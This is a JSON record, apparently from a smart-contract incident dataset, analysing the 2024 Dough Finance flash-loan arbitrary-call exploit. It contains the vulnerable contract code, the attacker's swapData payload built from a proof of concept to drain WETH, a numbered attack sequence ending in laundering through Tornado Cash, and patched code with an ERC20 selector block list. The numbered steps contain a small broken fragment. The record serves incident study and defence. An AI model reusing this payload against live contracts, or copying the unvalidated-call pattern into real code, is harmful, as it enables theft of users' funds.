@@ -1,0 +1,46 @@
+{
+ "id": "2024__2024-07-12_DoughFinance_FlashLoanArbitraryCall_ETH",
+ "source_file": "2024/2024-07-12_DoughFinance_FlashLoanArbitraryCall_ETH.md",
+ "title": "Dough Finance — Flash Loan Arbitrary Call Vulnerability Analysis",
+ "date": "2024-07-12",
+ "protocol": "Dough Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$1,960,000 USD total (two-wave attack; first wave ~608 ETH ~$1.8M, second wave added ~$140K)",
+ "loss_usd": 1960000.0,
+ "root_cause": "Unvalidated `swapData` calldata inside the `flashloanReq()` callback, allowing arbitrary execution of WETH.transferFrom()",
+ "attack_tx": "0x92cd...ebb2",
+ "vulnerable_contract": "0x9f54...fBE6 (ConnectorDeleverageParaswap)",
+ "classes": [
+  "arbitrary-call",
+  "flash-loan"
+ ],
+ "code_before": [
+  "// ConnectorDeleverageParaswap.sol (0x9f54e8eAa9658316Bb8006E03FFF1cb191AafBE6)\n\n// ❌ Vulnerable code\nfunction flashloanReq(\n    bool _opt,\n    address[] memory debtTokens,       // List of debt token addresses to repay\n    uint256[] memory debtAmounts,       // List of debt amounts to repay\n    uint256[] memory debtRateMode,      // Debt interest rate mode (stable/variable)\n    address[] memory collateralTokens,  // Collateral token addresses\n    uint256[] memory collateralAmounts, // Collateral amounts\n    bytes[] memory swapData             // ❌ Core vulnerability: external swap calldata (no validation)\n) external {\n    // Executes Aave V3 flash loan — calls executeOperation() as callback\n    // swapData is passed directly to external calls inside the callback\n    aavePool.flashLoan(\n        address(this),\n        debtTokens,\n        debtAmounts,\n        debtRateMode,\n        address(this),\n        abi.encode(_opt, debtTokens, debtAmounts, debtRateMode,\n                   collateralTokens, collateralAmounts, swapData),\n        0\n    );\n}",
+  "// ❌ Vulnerable code — swapData used without validation inside flash loan callback\nfunction executeOperation(\n    address[] calldata assets,\n    uint256[] calldata amounts,\n    uint256[] calldata premiums,\n    address initiator,\n    bytes calldata params\n) external override returns (bool) {\n    // Decode swapData from params (fully controlled by attacker)\n    (bool _opt, address[] memory debtTokens, uint256[] memory debtAmounts,\n     uint256[] memory debtRateMode, address[] memory collateralTokens,\n     uint256[] memory collateralAmounts, bytes[] memory swapData)\n        = abi.decode(params, (bool, address[], uint256[], uint256[],\n                              address[], uint256[], bytes[]));\n\n    // ... debt repayment logic ...\n\n    // ❌ swapData[0] executed as external call without validation\n    //    Attacker injects disguised executeAction() calldata to obtain WETH approve\n    (address target0, address token0In, , , address dsa0, ,\n     bytes memory callData0) = abi.decode(swapData[0], (...));\n    (bool success0,) = dsa0.call(callData0);  // ❌ Arbitrary call to DSA account\n    require(success0, \"swap0 failed\");\n\n    // ❌ swapData[1] executed as external call without validation\n    //    Attacker injects WETH.transferFrom(dsa, attacker, amount) calldata\n    (address target1, address token1In, , , address from1, address to1,\n     bytes memory callData1) = abi.decode(swapData[1], (...));\n    (bool success1,) = to1.call(callData1);   // ❌ transferFrom called directly on WETH contract\n    require(success1, \"swap1 failed\");\n\n    return true;\n}",
+  "// Actual attack swapData construction confirmed from PoC\n\n// swapData[0]: Call executeAction() on the DSA account to set WETH allowance\n//              (in practice, manipulates WETH approve or settings inside the DSA account)\nswapData[0] = abi.encode(\n    address(USDC),           // token0In (decoy)\n    address(USDC),           // token0Out (decoy)\n    type(uint128).max,       // amount (set to maximum)\n    type(uint128).max,\n    address(onBehalfOf),     // dsa: victim DSA account (call target)\n    address(onBehalfOf),\n    abi.encodeWithSelector(\n        bytes4(0x75b4b22d),  // executeAction() function selector\n        22,                  // connectorId (arbitrary)\n        address(USDC),       // tokenIn\n        5_000_000,           // amountIn\n        address(WETH),       // tokenOut\n        596_744_648_055_377_423_623,  // WETH amount to steal\n        2                    // actionId\n    )\n);\n\n// swapData[1]: Directly call WETH.transferFrom(dsa account, attacker, amount)\nswapData[1] = abi.encode(\n    address(USDC),           // token1In (decoy)\n    address(USDC),           // token1Out (decoy)\n    type(uint128).max,\n    type(uint128).max,\n    address(WETH),           // from: WETH contract address (disguised as call origin)\n    address(aave),           // to: ❌ actual call target — WETH contract\n    abi.encodeWithSelector(\n        bytes4(0x23b872dd),  // transferFrom(address,address,uint256) selector\n        address(onBehalfOf), // from: victim DSA account\n        address(this),       // to:   attack contract (beneficiary)\n        596_744_648_055_377_423_623   // amount: full WETH balance to steal\n    )\n);"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — swapData validation logic added\nfunction executeOperation(\n    address[] calldata assets,\n    uint256[] calldata amounts,\n    uint256[] calldata premiums,\n    address initiator,\n    bytes calldata params\n) external override returns (bool) {\n    (bool _opt, address[] memory debtTokens, uint256[] memory debtAmounts,\n     uint256[] memory debtRateMode, address[] memory collateralTokens,\n     uint256[] memory collateralAmounts, bytes[] memory swapData)\n        = abi.decode(params, (bool, address[], uint256[], uint256[],\n                              address[], uint256[], bytes[]));\n\n    // ... debt repayment logic ...\n\n    for (uint256 i = 0; i < swapData.length; i++) {\n        (address target, , , , address callTarget, ,\n         bytes memory callData) = abi.decode(swapData[i], (...));\n\n        // ✅ Verify that the call target is an allowed Paraswap router\n        require(isAllowedSwapTarget[callTarget], \"SWAP_TARGET_NOT_ALLOWED\");\n\n        // ✅ Verify calldata function selector is not a dangerous ERC20 function\n        bytes4 selector = bytes4(callData);\n        require(selector != IERC20.transferFrom.selector, \"BLOCKED: transferFrom\");\n        require(selector != IERC20.transfer.selector,     \"BLOCKED: transfer\");\n        require(selector != IERC20.approve.selector,      \"BLOCKED: approve\");\n\n        (bool success,) = callTarget.call(callData);\n        require(success, \"swap failed\");\n    }\n\n    return true;\n}",
+  "// ✅ Only allow external calls to whitelisted swap target contract addresses\nmapping(address => bool) public allowedSwapTargets;\n\nfunction _validateAndExecuteSwap(bytes memory swapDataEntry) internal {\n    (address tokenIn, address tokenOut, uint128 amtIn, uint128 amtOut,\n     address callFrom, address callTo, bytes memory callData)\n        = abi.decode(swapDataEntry, (address, address, uint128, uint128,\n                                     address, address, bytes));\n\n    // ✅ Verify call target is an allowed Paraswap router\n    require(allowedSwapTargets[callTo], \"SWAP_TARGET_NOT_ALLOWED\");\n\n    // ✅ Validate function selector: block dangerous ERC20 functions\n    if (callData.length >= 4) {\n        bytes4 selector = bytes4(callData);\n        require(selector != IERC20.transferFrom.selector, \"BLOCKED: transferFrom\");\n        require(selector != IERC20.transfer.selector,     \"BLOCKED: transfer\");\n        require(selector != IERC20.approve.selector,      \"BLOCKED: approve\");\n        require(selector != IERC20.permit.selector,       \"BLOCKED: permit\");\n    }\n\n    (bool success,) = callTo.call(callData);\n    require(success, \"SWAP_FAILED\");\n}"
+ ],
+ "steps": [
+  "1. USDC.approve(aave, MAX) ← Prepare for Aave repayment",
+  "2. aave.repay(USDC, 938566 USDC, victimDSA) ← Directly repay",
+  "3. USDC.transfer(vulnContract, 6 USDC) ← Small reserve to contract",
+  "4. aavePool.flashLoan(USDC, 5000 USDC, ..., params)",
+  "5. [swapData[0] executed]",
+  "6. [swapData[1] executed]",
+  "← WETH.transferFrom(victimDSA → attackContract, 596WETH)",
+  "7. transferFrom(",
+  "8. Receive 596.74 WETH",
+  "9. Repay flash loan 5000 USDC + fee (Aave)",
+  "10. Remaining WETH → USDC swap (~$830,000 profit per iteration)",
+  "11. Repeat steps 1–10 across 8 DSA accounts",
+  "12. Total 608 ETH (~$1,810,000) obtained",
+  "13. Next day: 500 ETH → laundered via Tornado Cash",
+  "Money Laundering | 500 ETH → Tornado Cash (2024-07-13)"
+ ],
+ "other_code": [
+  "1. USDC.Approval(attacker → Aave, MAX)\n2. USDC.Transfer(attacker → Aave, 938,566 USDC)     ← Debt repayment\n3. VariableDebtUSDC.Burn(victimDSA, 938,566)         ← Debt burn confirmed\n4. USDC.Transfer(attacker → ConnectorDeleverage, 6 USDC)\n5. [Aave FlashLoan start]\n6. USDC.Transfer(Aave → ConnectorDeleverage, 5,000 USDC)\n7. [executeOperation callback entered]\n8. WETH.Approval(victimDSA → ConnectorDeleverage, MAX)  ← result of swapData[0] execution\n9. WETH.Transfer(victimDSA → attackContract, 596.74 WETH) ← result of swapData[1] execution\n10. [Flash loan repaid: 5,000+ USDC including fee]\n11. Multiple ReserveDataUpdated events"
+ ]
+}
